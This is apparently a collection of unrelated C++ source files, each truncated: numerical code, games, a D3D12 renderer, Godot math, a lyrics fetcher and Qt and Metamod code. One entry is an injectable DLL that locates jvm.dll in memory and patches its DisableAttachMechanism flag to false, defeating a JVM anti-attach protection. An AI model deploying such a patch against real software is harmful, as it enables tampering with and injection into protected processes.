SizeOfUnknown; ++j)\r\n\t\t{\r\n\t\t\tif(j<matrix.size())\r\n\t\t\tmatrix[i].push_back(round(1 / (i + 1 + j) * pow(10, Accuracy)) / pow(10, Accuracy));\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\tif (j == matrix.size() + i)\r\n\t\t\t\t{\r\n\t\t\t\t\tmatrix[i].push_back(1);\r\n\t\t\t\t}\r\n\t\t\t\telse\r\n\t\t\t\t\tmatrix[i].push_back(0);\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n} \r\n\r\nvoid OutputOfMatrixWithAccuracy(vector<vector<double>> matrix, int Accuracy)\r\n{\r\n\tfor (int i = 0; i < matrix.size(); ++i)\r\n\t{\r\n\t\tfor (auto j : matrix[i])\r\n\t\t{\r\n\t\t\tcout <<setw(Accuracy+5)<<setprecision(Accuracy)<< j << ' ';\r\n\t\t}\r\n\t\tcout << '\\n'<<'\\n';\r\n\t}\r\n}\r\n\r\nvoid OutputOfMatrixWithoutAccuracy(vector<vector<double>> matrix, int Accuracy)\r\n{\r\n\tfor (int i = 0; i < matrix.size(); ++i)\r\n\t{\r\n\t\tfor (auto j : matrix[i])\r\n\t\t{\r\n\t\t\tcout << setw(9) << j << ' ';\r\n\t\t}\r\n\t\tcout << '\\n' << '\\n';\r\n\t}\r\n}\r\n\r\nvoid OutPutOfAnswer(vector<vector<double>> matrix)\r\n{\r\n\tfor (int i = 0; i < matrix.size(); ++i)\r\n\t{\r\n\t\tfor (int j = 0; j < matrix[0].size()-matrix.size(); ++j)\r\n\t\t{\r\n\t\t\tcout << \"x[\" << j + 1 << \"][\" << i + 1 << \"] = \" << matrix[i][j + matrix.size()] << \"   \";\r\n\t\t}\r\n\t\tcout << \"\\n\\n\";\r\n\t}\r\n}\r\n\r\nvoid OutPutOfAnswerWithSwitches(vector<vector<double>> matrix, vector<int> switches)\r\n{\r\n\tvector<vector<double>> answers(matrix[0].size() - matrix.size());\r\n\tfor (int i = 0; i < matrix.size(); ++i)\r\n\t{\r\n\t\tfor (int j = matrix.size(); j < matrix[0].size(); ++j)\r\n\t\t\tanswers[j-matrix.size()].push_back(matrix[i][j]);\r\n\t}\r\n\tint k = switches.size();\r\n\t\twhile (k)\r\n\t\t{\r\n\t\t\tfor (int i = 0; i < switches.size(); ++i)\r\n\t\t\t{\r\n\t\t\t\tif (switches[i] != i)\r\n\t\t\t\t{\r\n\t\t\t\t\tfor (int j = 0; j < answers.size(); ++j)\r\n\t\t\t\t\t\tswap(answers[j][i], answers[j][switches[i]]);\r\n\t\t\t\t}\r\n\t\t\t\tswap(switches[i], switches[switches[i]]);\r\n\t\t\t}\r\n\t\t\tk /= 2;\r\n\t\t}\r\n\tfor (int i = 0; i <answers[0].size(); ++i)\r\n\t{\r\n\t\tfor (int j = 0; j < answers.size(); ++j)\r\n\t\t{\r\n\t\t\tcout << \"x[\" << j+1 << \"][\" << i+1 << \"] = \" << answers[j][i] << \"   \";\r\n\t\t}\r\n\t\tcout << \"\\n\\n\";\r\n\t}\r\n}\r\n\r\nvoid DirectMove(vector<vector<double>>& matrix, int steps, int Accuracy)\r\n{\r\n\tfor (int j = matrix[steps].size() - 1; j >= steps; --j)\r\n\t{\r\n\t\tmatrix[steps][j] = round(matrix[steps][j] / matrix[steps][steps] * pow(10, Accuracy)) / pow(10, Accuracy);\r\n\t}\r\n\tfor (int i = matrix[steps].size() - 1; i >= 0; --i)\r\n\t\tfor (int j = steps + 1; j < matrix.size(); ++j)\r\n\t\t{\r\n\t\t\tmatrix[j][i] -= (matrix[steps][i] * matrix[j][steps]);\r\n\t\t\tmatrix[j][i] = round(matrix[j][i] * pow(10, Accuracy)) / pow(10, Accuracy);\r\n\t\t}\r\n}\r\n\r\nvoid DirectMoveOfGaussWithoutChoosingOfMainElement(vector<vector<double>> &matrix, int steps, int Accuracy, double &Det)\r\n{\r\n\tDirectMove(matrix, steps, Accuracy);\r\n\tif(steps<matrix.size()-1)\r\n\tDirectMoveOfGaussWithoutChoo",
    "#include <Windows.h>\n#include <winternl.h>\n#include <cstdint>\n#include <cstdio>\n#include <cwchar>\n\n// target address (0x180B878CC) - base address (0x180001000) = 0xB868CC\nconst uintptr_t DISABLE_ATTACH_MECHANISM_OFFSET = 0xB868CC;\n\nHMODULE GetModuleHandleModern(const wchar_t* moduleName) {\n    PPEB pPeb = reinterpret_cast<PPEB>(__readgsqword(0x60));\n    PPEB_LDR_DATA pLdr = pPeb->Ldr;\n    PLIST_ENTRY firstLink = &pLdr->InMemoryOrderModuleList;\n    PLIST_ENTRY currentLink = firstLink->Flink;\n\n    while (currentLink != firstLink) {\n        LDR_DATA_TABLE_ENTRY* entry = CONTAINING_RECORD(currentLink, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);\n        if (entry->FullDllName.Buffer) {\n            wchar_t* fullPath = entry->FullDllName.Buffer;\n            wchar_t* baseName = wcsrchr(fullPath, L'\\\\');\n            if (baseName) {\n                baseName++;\n            }\n            else {\n                baseName = fullPath;\n            }\n\n            if (_wcsicmp(baseName, moduleName) == 0) {\n                return reinterpret_cast<HMODULE>(entry->DllBase);\n            }\n        }\n        currentLink = currentLink->Flink;\n    }\n    return nullptr;\n}\n\nBOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {\n    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {\n        AllocConsole();\n        FILE* f;\n        if (freopen_s(&f, \"CONOUT$\", \"w\", stdout) == 0) {\n            HMODULE jvmModule = GetModuleHandleModern(L\"jvm.dll\");\n            if (jvmModule) {\n                printf(\"found jvm.dll\\n\");\n\n                bool* disableAttachMechanism = reinterpret_cast<bool*>(\n                    reinterpret_cast<uintptr_t>(jvmModule) + DISABLE_ATTACH_MECHANISM_OFFSET);\n\n                printf(\"DisableAttachMechanism address: %p, initial value: %d\\n\",\n                    static_cast<void*>(disableAttachMechanism), *disableAttachMechanism);\n\n                *disableAttachMechanism = false;\n                printf(\"new value: %d\\n\", *disableAttachMechanism);\n            }\n            else {\n                printf(\"failed to find jvm.dll\\n\");\n            }\n            fclose(f);\n        }\n        FreeConsole();\n    }\n    return TRUE;\n}",
    "//*********************************************************************\n// File name:\t Boomshine.cpp\n// Author:\t\t Bryant Hayden\n// Date:       5/9/2022\n// Class:\t\t   CS250\n// Assignment: Boomshine\n// Purpose:\t\t Implementation for boomshine class\n//*********************************************************************\n#include \"Boomshine.h\"\n//*********************************************************************\n// Constructor: Boomshine\n//\n// Description: creates a boomshine object\n//\n// Parameters:  gameLevel - levelOfBoomshine to be played\n//\n// Returned:    none\n//*********************************************************************\nBoomshine::Boomshine (int gameLevel) {\n\tmGameLevel = gameLevel;\n\tmScore = 0;\n\n\tbGameOver = false;\n\tbGamePlayed = false;\n\n\tmcMovingCircles = {};\n\tmcExpandingCircles = {};\n\n\tmpsAudio = Mix_LoadWAV (\"boom1.wav\");\n\n\tgenerateMovingCircles (gameLevel * 2);\n}\n//*********************************************************************\n// Function:    generateMovingCircles\n//\n// Description: generates movingCircles for boomshine\n//\n// Parameters:  numberCircles - number of circles to generate\n//\t\t\t\t\t\t\tbaseSpeed     - lowestSpeed of the circles\n//\t\t\t\t\t\t\tcircleRadius  - radius of moving circles\n//\n// Returned:    none\n//*********************************************************************\nvoid Boomshine::generateMovingCircles (unsigned numberCircles,\n\tconst int baseSpeed, const int circleRadius) {\n\t// This loop will randomly generate each value of a circle\n\t// during every iteration\n\tfor (unsigned circle = 0; circle < numberCircles; circle++) {\n\t\tint generatedX =\n\t\t\t(rand () % (WINDOW_SIZE_X - (2 * circleRadius) - 2))\n\t\t\t+ (circleRadius + 1);\n\t\tint generatedY =\n\t\t\t(rand () % (WINDOW_SIZE_Y - (2 * circleRadius) - 2))\n\t\t\t+ (circleRadius + 1);\n\t\tint generatedColorIndex = (rand () % TOTAL_COLORS + 2);\n\n\t\tDirection2D generatedDirection (Direction2D::E_Compass_Direction\n\t\t(rand () % Direction2D::NUMBER_OF_COORDINATES));\n\n\t\tColor generatedColor = Color (Color::E_COLOR (generatedColorIndex));\n\n\t\tMovingCircle randomCircle (generatedX, generatedY, circleRadius,\n\t\t\tgeneratedColor, generatedDirection, rand () % 3 + baseSpeed);\n\n\t\trandomCircle.setMovementBoundingBox\n\t\t(0, 0, WINDOW_SIZE_X, WINDOW_SIZE_Y);\n\n\t\tmcMovingCircles.push_back (randomCircle);\n\t}\n}\n//*********************************************************************\n// Function:    handleExpansions\n//\n// Description: keeps track each expandingCircle and their expansion\n//\n// Parameters:  none\n//\n// Returned:    none\n//*********************************************************************\nvoid Boomshine::manageExpandingCircles () {\n\tfor (auto &it : mcExpandingCircles) {\n\t\tif (!it.getIsExpanded ()) {\n\t\t\tit.expand ();\n\t\t}\n\t\telse if (!it.getWaited ()) {\n\t\t\tit.wait ();\n\t\t}\n\t\telse if (!it.getIsContracted ()) {\n\t\t\tit.contract ();\n\t\t}\n\t\telse {\n\t\t\tmcExpandingCircles.erase (mcExpandingCircles.begin ());\n\t\t}\n\t}\n}\n//*********************************************************************\n// Function:    handleMovements\n//\n// Description: handlesMovements of MovingCircles\n//\n// Parameters:  none\n//\n// Returned:    none\n//*********************************************************************\nvoid Boomshine::moveCircles () {\n\tfor (auto &it : mcMovingCircles) {\n\t\tit.move ();\n\t}\n}\n//*********************************************************************\n// Function:    getScore\n//\n// Description: gets score after Circles are done expanding\n//\n// Parameters:  none\n//\n// Returned:    score of the game\n//*********************************************************************\nint Boomshine::getscore () const {\n\treturn (mGameLevel * 2) - mcMovingCircles.size ();\n}\n\n//*********************************************************************\n// Function:    handleCollisions\n//\n// Description: checks for collision of movingCircles and\n//\t\t\t\t\t\t\texpandingCircles, if there is a collision, the\n//\t\t\t\t\t\t\tmovingCircle gets turned into a expanding circle\n//\n// Parameters:  none\n//\n// Returned:    none\n//*********************************************************************\nvoid Boomshine::checkCollisions () {\n\tfor (unsigned expanding = 0; expanding < mcExpandingCircles.size ();\n\t\texpanding++) {\n\n\t\tfor (unsigned moving = 0; moving < mcMovingCircles.size ();\n\t\t\tmoving++) {\n\n\t\t\tif (mcMovingCircles.at (moving).collision\n\t\t\t(mcExpandingCircles.at (expanding))) {\n\n\t\t\t\tMix_PlayChannel (1, mpsAudio, 0);\n\n\t\t\t\tmcExpandingCircles.push_back\n\t\t\t\t(ExpandingCircle (mcMovingCircles.at (moving)));\n\n\t\t\t\tmcMovingCircles.erase (mcMovingCircles.begin () + moving);\n\t\t\t}\n\t\t}\n\t}\n}\n//*********************************************************************\n// Function:    drawCircles\n//\n// Description: draw member circles with a SDLMangager\n//\n// Parameters:  rcSDLManager - passed in to be used in draw()\n//\n// Returned:    none\n//*********************************************************************\nvoid Boomshine::drawCircles (SDLManager &rcSDLManager) {\n\tfor (auto &it : mcMovingCircles) {\n\t\tit.draw (rcSDLManager);\n\t}\n\t/",
    "#include \"Scene.h\"\n\nScene::Scene(Device& device)\n    : m_device(device)\n{\n    m_instanceDataCpu = device.CreateBuffer(c_instanceDataSize, D3D12_RESOURCE_STATE_COMMON, D3D12_RESOURCE_FLAG_NONE, true);\n    m_instanceDataGpu = device.CreateBuffer(c_instanceDataSize);\n    m_tlasBuildData = device.CreateBuffer(c_instanceDataSize * sizeof(D3D12_RAYTRACING_INSTANCE_DESC), D3D12_RESOURCE_STATE_COMMON, D3D12_RESOURCE_FLAG_NONE, true);\n\n    D3D12_SHADER_RESOURCE_VIEW_DESC instanceDataViewDesc;\n    instanceDataViewDesc.ViewDimension = D3D12_SRV_DIMENSION_BUFFER;\n    instanceDataViewDesc.Format = DXGI_FORMAT_UNKNOWN;\n    instanceDataViewDesc.Shader4ComponentMapping = D3D12_DEFAULT_SHADER_4_COMPONENT_MAPPING;\n    instanceDataViewDesc.Buffer.Flags = D3D12_BUFFER_SRV_FLAG_NONE;\n    instanceDataViewDesc.Buffer.FirstElement = 0;\n    instanceDataViewDesc.Buffer.NumElements = c_instanceCount;\n    instanceDataViewDesc.Buffer.StructureByteStride = sizeof(Instance);\n    m_instanceDataHandle = device.CreateShaderResourceView(m_instanceDataGpu, instanceDataViewDesc);\n\n    m_modelRefs.reserve(c_instanceCount);\n\n    D3D12_RANGE range = {0, c_instanceDataSize};\n    m_instanceDataCpu->Map(0, &range, (void**)&m_instanceDataPtr);\n}\n\nvoid Scene::Update(const ComPtr<ID3D12GraphicsCommandList>& commandList)\n{\n    if(m_transformsDirty || m_instanceDataDirty)\n    {\n        D3D12_RANGE writeRange = {0, c_instanceDataSize};\n        m_instanceDataCpu->Unmap(0, &writeRange);\n\n        commandList->CopyResource(m_instanceDataGpu.Get(), m_instanceDataCpu.Get());\n        \n        m_instanceDataCpu->Map(0, nullptr, (void**)&m_instanceDataPtr);\n    }\n\n    if(m_transformsDirty)\n    {\n        m_tlas = m_device.CreateTopLevelAccelerationStructure(commandList.Get(), m_tlasBuildData.Get(), (uint32_t)m_modelRefs.size());\n    }\n\n    m_transformsDirty = false;\n    m_instanceDataDirty = false;\n}\n\nvoid Scene::Draw(const ComPtr<ID3D12GraphicsCommandList>& commandList)\n{\n    for (auto i = 0u; i < m_modelRefs.size(); ++i)\n    {\n        m_modelRefs[i]->Draw(commandList, i);\n    }\n}\n\nuint32_t Scene::AddInstance(const Model& model, const DirectX::XMMATRIX& transform, const DirectX::XMVECTOR& albedo, const DirectX::XMVECTOR& emission)\n{\n    assert(m_modelRefs.size() < c_instanceCount);\n\n    const uint32_t instanceId = (uint32_t)m_modelRefs.size();\n    m_modelRefs.push_back(&model);\n\n    auto& instance = m_instanceDataPtr[instanceId];\n    instance.Transform = transform;\n    instance.Albedo = albedo;\n    instance.Emission = emission;\n\n    D3D12_RAYTRACING_INSTANCE_DESC* buildData;\n    m_tlasBuildData->Map(0, nullptr, (void**)&buildData);\n\n    const auto transposedTransform = DirectX::XMMatrixTranspose(transform);\n\n    auto& instanceBuildData = buildData[instanceId];\n    instanceBuildData.AccelerationStructure = model.GetBLAS()->GetGPUVirtualAddress();\n    instanceBuildData.Flags = D3D12_RAYTRACING_INSTANCE_FLAG_NONE; //D3D12_RAYTRACING_INSTANCE_FLAG_TRIANGLE_CULL_DISABLE;\n    instanceBuildData.InstanceContributionToHitGroupIndex = 0;\n    instanceBuildData.InstanceID = instanceId;\n    instanceBuildData.InstanceMask = 0xFF;\n    std::memcpy(instanceBuildData.Transform, &transposedTransform, sizeof(instanceBuildData.Transform));\n\n    D3D12_RANGE writeRange = {instanceId * sizeof(D3D12_RAYTRACING_INSTANCE_DESC), (instanceId + 1) * sizeof(D3D12_RAYTRACING_INSTANCE_DESC) };\n    m_tlasBuildData->Unmap(0, &writeRange);\n\n    m_transformsDirty = true;\n    m_instanceDataDirty = true;\n\n    return instanceId;\n}\n\nvoid Scene::SetInstanceTransform(uint32_t instanceId, const DirectX::XMMATRIX& transform)\n{\n    auto& instance = m_instanceDataPtr[instanceId];\n    instance.Transform = transform;\n\n    D3D12_RAYTRACING_INSTANCE_DESC* buildData;\n    m_tlasBuildData->Map(0, nullptr, (void**)&buildData);\n\n    const auto transposedTransform = DirectX::XMMatrixTranspose(transform);\n\n    auto& instanceBuildData = buildData[instanceId];\n    std::memcpy(instanceBuildData.Transform, &transposedTransform, sizeof(instanceBuildData.Transform));\n\n    D3D12_RANGE writeRange = {instanceId * sizeof(D3D12_RAYTRACING_INSTANCE_DESC), (instanceId + 1) * sizeof(D3D12_RAYTRACING_INSTANCE_DESC) };\n    m_tlasBuildData->Unmap(0, &writeRange);\n\n    m_transformsDirty = true;\n}",
    "/**************************************************************************/\n/*  quaternion.cpp                                                        */\n/**************************************************************************/\n/*                         This file is part of:                          */\n/*                             GODOT ENGINE                               */\n/*                        https://godotengine.org                         */\n/**************************************************************************/\n/* Copyright (c) 2014-present Godot Engine contributors (see AUTHORS.md). */\n/* Copyright (c) 2007-2014 Juan Linietsky, Ariel Manzur.                  */\n/*                                                                        */\n/* Permission is hereby granted, free of charge, to any person obtaining  */\n/* a copy of this software and associated documentation files (the        */\n/* \"Software\"), to deal in the Software without restriction, including    */\n/* without limitation the rights to use, copy, modify, merge, publish,    */\n/* distribute, sublicense, and/or sell copies of the Software, and to     */\n/* permit persons to whom the Software is furnished to do so, subject to  */\n/* the following conditions:                                              */\n/*                                                                        */\n/* The above copyright notice and this permission notice shall be         */\n/* included in all copies or substantial portions of the Software.        */\n/*                                                                        */\n/* THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND,        */\n/* EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF     */\n/* MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. */\n/* IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY   */\n/* CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,   */\n/* TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE      */\n/* SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.                 */\n/**************************************************************************/\n\n#include <godot_cpp/variant/quaternion.hpp>\n\n#include <godot_cpp/variant/basis.hpp>\n#include <godot_cpp/variant/string.hpp>\n\nnamespace godot {\n\nreal_t Quaternion::angle_to(const Quaternion &p_to) const {\n\treal_t d = dot(p_to);\n\treturn Math::acos(CLAMP(d * d * 2 - 1, -1, 1));\n}\n\n// get_euler_xyz returns a vector containing the Euler angles in the format\n// (ax,ay,az), where ax is the angle of rotation around x axis,\n// and similar for other axes.\n// This implementation uses XYZ convention (Z is the first rotation).\nVector3 Quaternion::get_euler_xyz() const {\n\tBasis m(*this);\n\treturn m.get_euler(EULER_ORDER_XYZ);\n}\n\n// get_euler_yxz returns a vector containing the Euler angles in the format\n// (ax,ay,az), where ax is the angle of rotation around x axis,\n// and similar for other axes.\n// This implementation uses YXZ convention (Z is the first rotation).\nVector3 Quaternion::get_euler_yxz() const {\n#ifdef MATH_CHECKS\n\tERR_FAIL_COND_V_MSG(!is_normalized(), Vector3(0, 0, 0), \"The quaternion must be normalized.\");\n#endif\n\tBasis m(*this);\n\treturn m.get_euler(EULER_ORDER_YXZ);\n}\n\nvoid Quaternion::operator*=(const Quaternion &p_q) {\n\treal_t xx = w * p_q.x + x * p_q.w + y * p_q.z - z * p_q.y;\n\treal_t yy = w * p_q.y + y * p_q.w + z * p_q.x - x * p_q.z;\n\treal_t zz = w * p_q.z + z * p_q.w + x * p_q.y - y * p_q.x;\n\tw = w * p_q.w - x * p_q.x - y * p_q.y - z * p_q.z;\n\tx = xx;\n\ty = yy;\n\tz = zz;\n}\n\nQuaternion Quaternion::operator*(const Quaternion &p_q) const {\n\tQuaternion r = *this;\n\tr *= p_q;\n\treturn r;\n}\n\nbool Quaternion::is_equal_approx(const Quaternion &p_quaternion) const {\n\treturn Math::is_equal_approx(x, p_quaternion.x) && Math::is_equal_approx(y, p_quaternion.y) && Math::is_equal_approx(z, p_quaternion.z) && Math::is_equal_approx(w, p_quaternion.w);\n}\n\nbool Quaternion::is_finite() const {\n\treturn Math::is_finite(x) && Math::is_finite(y) && Math::is_finite(z) && Math::is_finite(w);\n}\n\nreal_t Quaternion::length() const {\n\treturn Math::sqrt(length_squared());\n}\n\nvoid Quaternion::normalize() {\n\t*this /= length();\n}\n\nQuaternion Quaternion::normalized() const {\n\treturn *this / length();\n}\n\nbool Quaternion::is_normalized() const {\n\treturn Math::is_equal_approx(length_squared(), 1, (real_t)UNIT_EPSILON); //use less epsilon\n}\n\nQuaternion Quaternion::inverse() const {\n#ifdef MATH_CHECKS\n\tERR_FAIL_COND_V_MSG(!is_normalized(), Quaternion(), \"The quaternion must be normalized.\");\n#endif\n\treturn Quaternion(-x, -y, -z, w);\n}\n\nQuaternion Quaternion::log() const {\n\tQuaternion src = *this;\n\tVector3 src_v = src.get_axis() * src.get_angle();\n\treturn Quaternion(src_v.x, src_v.y, src_v.z, 0);\n}\n\nQuaternion Quaternion::exp() const {\n\tQuaternion src = *this;\n\tVector3 src_v = Vector3(src.x, src.y, src.z);\n\treal_t theta = src_v.length();\n\tsrc_v = src_v.",
    "#include <string>\n#include <iostream>\n#include <curl/curl.h>\n#include <regex>\n\nstd::string replaceString(std::string x, std::string y, std::string z) {\n\n    std::string::size_type pos = 0;\n    while ((pos = x.find(y, pos)) != std::string::npos)\n    {\n        x.replace(pos, y.size(), z);\n        pos += 2;\n    }\n    return x;\n}\n\nsize_t writeFunction(void *ptr, size_t size, size_t nmemb, std::string* data) {\n\n    data->append((char*) ptr, size * nmemb);\n    return size * nmemb;\n}\n\nint main() {\n\n    std::string searchTerm;\n    std::getline(std::cin, searchTerm);\n\n    searchTerm = replaceString(searchTerm, \" \", \"+\");\n\n    curl_global_init(CURL_GLOBAL_DEFAULT);\n    auto curl = curl_easy_init();\n\n    std::string response_string;\n\n    if (curl) {\n\n        const std::string link = \"https://lrclib.net/api/search?q=\" + searchTerm;\n\n        curl_easy_setopt(curl, CURLOPT_URL, link.c_str());\n        curl_easy_setopt(curl, CURLOPT_NOPROGRESS, 1L);\n        curl_easy_setopt(curl, CURLOPT_MAXREDIRS, 50L);\n        curl_easy_setopt(curl, CURLOPT_TCP_KEEPALIVE, 1L);\n\n        std::string header_string;\n        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writeFunction);\n        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_string);\n        curl_easy_setopt(curl, CURLOPT_HEADERDATA, &header_string);\n\n        curl_easy_perform(curl);\n        curl_easy_cleanup(curl);\n        curl_global_cleanup();\n        curl = NULL;\n    }\n\n    const std::regex fmttime(\"\\\"syncedLyrics\\\":\\\"\");\n    const std::regex fmtend(\"\\\"}\");\n    std::smatch m;\n\n    response_string = std::regex_replace(response_string, std::regex(\"\\n\"), \"\");\n\n    std::regex_search(response_string, m, fmttime); \n    response_string = m.suffix();\n    std::regex_search(response_string, m, fmtend);\n    response_string = m.prefix();\n\n    response_string = replaceString(response_string, R\"(\\\")\", R\"(\")\");\n    response_string = replaceString(response_string, \"\\\\n\", \"\\n\");\n\n    std::cout << response_string;\n\n    return 0;\n}\n",
    "/**\n * \u00a9 2024 Jerry Tan. All Rights Reserved.\n *\n * This software is the confidential and proprietary information of Jerry Tan\n * (\"Confidential Information\"). You shall not disclose such Confidential Information\n * and shall use it only in accordance with the terms under which this software\n * was distributed or otherwise published, and solely for the prior express purposes\n * explicitly communicated and agreed upon, and only for those specific permissible purposes.\n *\n * This software is provided \"AS IS,\" without a warranty of any kind. All express or implied\n * conditions, representations, and warranties, including any implied warranty of merchantability,\n * fitness for a particular purpose, or non-infringement, are disclaimed, except to the extent\n * that such disclaimers are held to be legally invalid.\n *\n * * This source file is part of the Device Driver Demo project.\n */\n\n#include <iostream>\n\nclass Device {\npublic:\n    // Virtual method for initializing the device\n    virtual void initialize() = 0;\n    \n    // Virtual method for reading data from the device\n    virtual void readData() = 0;\n\n    // Virtual destructor to ensure proper cleanup of derived objects\n    virtual ~Device() = default;\n};\n\nclass Keyboard : public Device {\npublic:\n    // Initialize the keyboard\n    void initialize() override {\n        std::cout << \"Initializing Keyboard...\" << std::endl;\n    }\n    \n    // Read data from the keyboard\n    void readData() override {\n        std::cout << \"Reading keyboard data...\" << std::endl;\n    }\n};\n\nclass Mouse : public Device {\npublic:\n    // Initialize the mouse\n    void initialize() override {\n        std::cout << \"Initializing Mouse...\" << std::endl;\n    }\n\n    // Read data from the mouse\n    void readData() override {\n        std::cout << \"Reading mouse data...\" << std::endl;\n    }\n};\n\n// Helper function to set up and interact with a device\nvoid setupDevice(Device* device) {\n    device->initialize();  // Call the initialize method (polymorphism in action)\n    device->readData();    // Call the read data method (dynamic dispatch)\n}\n\nint main() {\n    // Create Keyboard and Mouse objects\n    Keyboard keyboard;\n    Mouse mouse;\n\n    // Setup the devices using the helper function\n    setupDevice(&keyboard);  // Works with the Keyboard object\n    setupDevice(&mouse);     // Works with the Mouse object\n\n    return 0;  // Indicate that the program ended successfully\n}\n",
    "\ufeff// Including the necessary header files (.h files) and libraries (qDebug) to this .cpp file.\n#include \"mainwindow.h\"\n#include \"ui_mainwindow.h\"\n#include <QDebug>\n\nMainWindow::MainWindow(QWidget *parent)\n    : QMainWindow(parent), ui(new Ui::MainWindow)\n{\n    ui->setupUi(this);\n\n    // Device off's icons for duration and sessions.\n    QString arrQListAbove[3] = {\":/resources/icons/20Minute.png\", \":/resources/icons/45Minute.png\", \":/resources/icons/UserDesignated.png\"};\n    QString arrQListBelow[4] = {\":/resources/icons/Alpha.png\", \":/resources/icons/Beta1.png\", \":/resources/icons/Beta2.png\", \":/resources/icons/Theta.png\"};\n\n    qDebug() << \"MainWindow: Starting database initialization...\";\n\n    // Creates a success variable to see if the database has successfully started certain components without errors.\n    // - success = 0 =====> success (no errors).\n    // - success = 1 =====> not successfully (errors were encountered).\n    int success = 0;\n\n    // Instantiate Database object.\n    newDatabase = new Database();\n\n    // Checks if the database was not initialize.\n    if (!newDatabase->initializeDatabase())\n    {\n        qDebug() << \"MainWindow: Unable to initialize the database...\";\n\n        // Set success variable to 1 (not successful - errors found).\n        success = 1;\n    }\n    else\n    {\n        qDebug() << \"MainWindow: Created database...\";\n\n        // Set success variable to 0 (success - no errors found).\n        success = 0;\n    }\n\n    // Checks if the database tables were not initialized.\n    if (!newDatabase->initializeDatabaseTables())\n    {\n        qDebug() << \"MainWindow: Unable to create the database's tables ('users' and 'treatmentHistory')...\";\n\n        // Set success variable to 1 (not successful - errors found).\n        success = 1;\n    }\n    else\n    {\n        qDebug() << \"MainWindow: Created the database's tables ('users' and 'treatmentHistory')...\";\n\n        // Set success variable to 0 (success - no errors found).\n        success = 0;\n    }\n\n    // Checks if the success variable is equal to 0 (if it is then that means that it was able to\n    // to successfully initialize the table and database).\n    if (success == 0)\n    {\n        qDebug() << \"MainWindow: Operation 'initialize the table and database' was successfully completed...\";\n        qDebug() << \"MainWindow: Testing: Getting users details...\";\n\n        // Setting usernames in combobox.\n        userRecords = newDatabase->getUserData();\n        bool flag = true;\n\n        // Populate combo box with result of user records:\n\n        // Testing if it can retrieve user data.\n        if (userRecords.isEmpty())\n        {\n            flag = false;\n            qDebug(\"MainWindow: No user records. \");\n        }\n        // Populate listview with recordings\n        else\n        {\n            qDebug(\"MainWindow: Importing user records... \");\n            QVector<Users *>::iterator ittUser;\n\n            for (ittUser = userRecords.begin(); ittUser != userRecords.end(); ++ittUser)\n            {\n\n                int userId = (*ittUser)->getId();\n                QString userName = (*ittUser)->getName();\n                (*ittUser)->print();\n\n                ui->listOfUsers->setItemText(userId - 1, userName);\n            }\n        }\n        if (flag)\n        {\n            qDebug() << \"MainWindow: Operation 'import user records' was successfully completed...\";\n        }\n        else\n        {\n            qDebug() << \"MainWindow: Operation 'import user records' was not completed...\";\n        }\n    }\n    else\n    {\n        qDebug() << \"MainWindow: Operation 'initialize the table and database' was not completed...\";\n    }\n\n    // Everything needs start in off state (power off) in the GUI\n    deviceOff();\n    offConnect();\n    initialiazeListOfIcons();\n\n    // Set application icon.\n    setWindowIcon(QIcon(\":/resources/icons/companyIcon.png\"));\n\n    // Initialize and set parameters and connections of the necessary timers.\n    batteryStartTimer = new QTimer(this);\n    batteryStopTimer = new QTimer(this);\n    batteryDegradationTimer = new QTimer(this);\n    connect(batteryStartTimer, SIGNAL(timeout()), this, SLOT(showBatteryLevel()));\n    connect(batteryStopTimer, SIGNAL(timeout()), this, SLOT(stopBatteryLevel()));\n    batteryStopTimer->setSingleShot(true);\n    connect(batteryDegradationTimer, SIGNAL(timeout()), this, SLOT(degradeBattery()));\n\n    // When connection test passed do the following.\n    connectionTestStartTimer = new QTimer(this);\n    connectionTestStopTimer = new QTimer(this);\n    connectionTestStopTimer->setSingleShot(true);\n\n    // Battery color control and percentage display (progressbar).\n    ui->batteryLeft->setOrientation(Qt::Horizontal);\n    ui->batteryLeft->setRange(0, 100);\n    ui->batteryLeft->setValue(batteryLevel);\n\n    // Check whether the battery level at the start is greater than 75%.\n    if(batteryLevel > 75) {\n        // Change color of progresbar to green.\n        ui->batteryLeft->setStyleSheet(\"#batteryLeft { border: 2px solid",
    "/**\n * vim: set ts=4 sw=4 tw=99 noet :\n * ======================================================\n * Metamod:Source Tickrate\n * Written by Wend4r (Vladimir Ezhikov).\n * ======================================================\n\n * This program is free software: you can redistribute it and/or modify\n * it under the terms of the GNU General Public License as published by\n * the Free Software Foundation, either version 3 of the License, or\n * (at your option) any later version.\n\n * This program is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n * GNU General Public License for more details.\n\n * You should have received a copy of the GNU General Public License\n * along with this program.  If not, see <https://www.gnu.org/licenses/>.\n */\n\n#include <tickrate/provider.hpp>\n\nTickrate::Provider::GameDataStorage::CTick::CTick()\n{\n\t{\n\t\tauto &aCallbacks = m_aAddressCallbacks;\n\n\t\taCallbacks.Insert(m_aGameConfig.GetSymbol(\"&tick_interval\"), [&](const CUtlSymbolLarge &, const DynLibUtils::CMemory &aAddress)\n\t\t{\n\t\t\tm_pInterval = aAddress.RCast<decltype(m_pInterval)>();\n\t\t});\n\n\t\taCallbacks.Insert(m_aGameConfig.GetSymbol(\"&(double)tick_interval\"), [&](const CUtlSymbolLarge &, const DynLibUtils::CMemory &aAddress)\n\t\t{\n\t\t\tm_pInterval2 = aAddress.RCast<decltype(m_pInterval2)>();\n\t\t});\n\n\t\taCallbacks.Insert(m_aGameConfig.GetSymbol(\"&tick_interval3_default\"), [&](const CUtlSymbolLarge &, const DynLibUtils::CMemory 